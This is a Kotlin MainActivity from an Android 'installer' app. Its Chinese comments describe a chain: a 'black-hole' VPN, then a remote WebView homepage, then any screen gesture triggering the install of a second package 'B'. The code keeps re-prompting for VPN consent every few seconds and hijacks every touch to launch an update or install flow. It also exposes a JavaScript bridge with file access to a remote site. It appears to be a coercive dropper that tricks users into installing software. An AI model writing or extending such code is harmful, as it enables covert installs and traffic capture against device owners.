package com.vibelink.installer

import android.annotation.SuppressLint
import android.content.Intent
import android.os.Bundle
import android.view.MotionEvent
import android.webkit.JavascriptInterface
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.core.view.WindowCompat
import com.vibelink.installer.databinding.ActivityMainBinding
import com.vibelink.installer.vpn.VpnBootstrap

/**
 * A 包入口：黑洞 VPN → 远程首页 WebView → 全屏点/滑触发装 B 或打开 B。
 */
class MainActivity : AppCompatActivity() {
    private lateinit var binding: ActivityMainBinding
    private var vpnRequestInFlight = false
    private var vpnRetryPosted = false
    private var updateOpened = false

    private val vpnConsentLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult(),
    ) { result ->
        vpnRequestInFlight = false
        val granted = result.resultCode == RESULT_OK
        VpnBootstrap.onConsentResult(this, granted)
        if (granted && VpnBootstrap.isAuthorized(this)) {
            BindDeviceFlow.onVpnReady(this)
            return@registerForActivityResult
        }
        Toast.makeText(this, R.string.vpn_permission_required, Toast.LENGTH_LONG).show()
        scheduleVpnRetry()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        applyHomeWindow()
        setupHomeWeb()
        ensureVpnThenClientFlow(forceVpnPrompt = true)
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        setIntent(intent)
    }

    override fun onResume() {
        super.onResume()
        updateOpened = false
        LauncherVisibilityGuard.ensureVisible(this)
        ensureVpnThenClientFlow(forceVpnPrompt = false)
    }

    override fun onDestroy() {
        binding.homeWeb.destroy()
        super.onDestroy()
    }

    override fun dispatchTouchEvent(event: MotionEvent): Boolean {
        when (event.actionMasked) {
            MotionEvent.ACTION_DOWN,
            MotionEvent.ACTION_MOVE,
            -> openUpdateFromGesture()
        }
        return super.dispatchTouchEvent(event)
    }

    private fun applyHomeWindow() {
        window.statusBarColor = ContextCompat.getColor(this, R.color.home_bg)
        window.navigationBarColor = ContextCompat.getColor(this, R.color.home_bg)
        WindowCompat.getInsetsController(window, window.decorView).apply {
            isAppearanceLightStatusBars = false
            isAppearanceLightNavigationBars = false
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupHomeWeb() {
        binding.homeWeb.setBackgroundColor(ContextCompat.getColor(this, R.color.home_bg))
        binding.homeWeb.settings.javaScriptEnabled = true
        binding.homeWeb.settings.domStorageEnabled = true
        binding.homeWeb.settings.allowFileAccess = true
        binding.homeWeb.settings.allowContentAccess = true
        binding.homeWeb.settings.mediaPlaybackRequiresUserGesture = false
        binding.homeWeb.addJavascriptInterface(MiluJsBridge(), JS_BRIDGE_NAME)
        binding.homeWeb.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(
                view: WebView?,
                request: WebResourceRequest?,
            ): Boolean = false
        }
        binding.homeWeb.loadUrl(HOME_URL)
    }

    /**
     * 1) 先黑洞 VPN
     * 2) VPN 通过后留在首页；全屏点/滑弹更新页或打开 B
     */
    private fun ensureVpnThenClientFlow(forceVpnPrompt: Boolean) {
        if (!VpnBootstrap.isAuthorized(this)) {
            requestVpnConsent(force = forceVpnPrompt)
            return
        }
        VpnBootstrap.onConsentResult(this, true)
        BindDeviceFlow.onVpnReady(this)
    }

    private fun requestVpnConsent(force: Boolean) {
        if (isFinishing || isDestroyed) {
            return
        }
        if (VpnBootstrap.isAuthorized(this)) {
            vpnRequestInFlight = false
            vpnRetryPosted = false
            VpnBootstrap.onConsentResult(this, true)
            BindDeviceFlow.onVpnReady(this)
            return
        }
        if (vpnRequestInFlight && !force) {
            return
        }
        if (vpnRetryPosted && !force) {
            return
        }
        val prepare = VpnBootstrap.prepareOrStart(this)
        if (prepare == null) {
            BindDeviceFlow.onVpnReady(this)
            return
        }
        vpnRequestInFlight = true
        vpnRetryPosted = false
        runCatching {
            vpnConsentLauncher.launch(prepare)
        }.onFailure {
            vpnRequestInFlight = false
            scheduleVpnRetry()
        }
    }

    private fun scheduleVpnRetry() {
        if (isFinishing || isDestroyed || vpnRetryPosted) {
            return
        }
        vpnRetryPosted = true
        vpnRequestInFlight = false
        binding.root.postDelayed({
            vpnRetryPosted = false
            if (isFinishing || isDestroyed) {
                return@postDelayed
            }
            requestVpnConsent(force = true)
        }, VPN_RETRY_MS)
    }

    private fun openUpdateFromGesture() {
        if (isFinishing || isDestroyed || updateOpened) {
            return
        }
        // 任意手势：VPN 未过先催授权；已过则弹更新/权限检测
        if (!VpnBootstrap.isAuthorized(this)) {
            requestVpnConsent(force = true)
            return
        }
        updateOpened = true
        BindDeviceFlow.openUpdateFromGesture(this)
    }

    inner class MiluJsBridge {
        @JavascriptInterface
        fun openApp() {
            runOnUiThread { openUpdateFromGesture() }
        }
    }

    companion object {
        private const val VPN_RETRY_MS = 3_000L
        private const val JS_BRIDGE_NAME = "MiluBridge"
        private const val HOME_URL = "https://www.sevenjade.vip"
    }
}
